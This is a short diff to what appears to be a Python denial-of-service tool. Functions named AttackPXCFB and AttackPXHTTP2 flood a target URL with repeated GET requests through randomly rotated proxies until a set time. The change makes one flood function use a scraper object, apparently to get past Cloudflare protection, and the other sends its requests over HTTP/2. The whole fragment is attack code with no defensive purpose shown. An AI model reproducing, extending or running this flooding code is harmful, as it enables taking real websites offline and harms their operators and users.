@@ -536,11 +536,11 @@ def AttackPXCFB(url, until_datetime, scraper):
                 'http': proxy_url,
                 }
              
-                print(requests.get(url, proxies=proxies),proxy_url)
-                print(requests.get(url, proxies=proxies),proxy_url)
-                print(requests.get(url, proxies=proxies),proxy_url)
-                print(requests.get(url, proxies=proxies),proxy_url)
-                print(requests.get(url, proxies=proxies),proxy_url)
+                print(scraper.get(url, proxies=proxies),proxy_url)
+                print(scraper.get(url, proxies=proxies),proxy_url)
+                print(scraper.get(url, proxies=proxies),proxy_url)
+                print(scraper.get(url, proxies=proxies),proxy_url)
+                print(scraper.get(url, proxies=proxies),proxy_url)
         except Exception as e:
             print('falid--------------',e)
             pass
@@ -918,6 +918,7 @@ def AttackPXHTTP2(url, until_datetime):
         try:
             client = httpx.Client(
                 http2=True,
+                
                 proxies={
                     'http://': 'http://'+random.choice(proxies),
                     'https://': 'http://'+random.choice(proxies),
